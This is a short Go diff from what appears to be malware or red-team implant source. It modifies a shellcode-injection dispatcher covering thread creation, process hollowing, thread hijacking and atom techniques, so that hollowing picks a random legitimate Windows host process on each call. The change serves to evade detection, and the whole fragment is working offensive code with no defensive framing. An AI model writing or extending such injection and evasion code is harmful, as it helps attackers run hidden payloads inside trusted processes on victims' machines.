@@ -327,7 +327,12 @@ func injectProcess(pid uint32, shellcode []byte, tech string) error {
 	case "indirect":
 		return doNtCreateThreadExIndirect(hProc, shellcode)
 	case "hollow":
-		return hollowProcess("rundll32.exe", shellcode)
+		// Per-call random benign host (rundll32/dllhost/svchost/explorer)
+		// with fallback through the pool, instead of a fixed image.
+		if _, err := hollowProcessRandomHost(shellcode); err != nil {
+			return err
+		}
+		return nil
 	case "hijack":
 		return hijackThread(pid, shellcode)
 	case "atom":
